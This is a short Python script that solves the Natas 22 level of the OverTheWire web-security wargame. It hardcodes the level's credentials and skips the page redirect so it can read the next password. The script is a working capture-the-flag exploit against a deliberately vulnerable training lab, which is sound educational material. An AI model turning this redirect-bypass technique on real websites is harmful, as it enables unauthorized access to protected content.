
import requests

auth = ('natas22', 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ')

req = requests.get(
    "http://natas22.natas.labs.overthewire.org/index.php?revelio", auth=auth, allow_redirects=False)

results = req.text.split()
print(results[results.index("Password:") + 1])
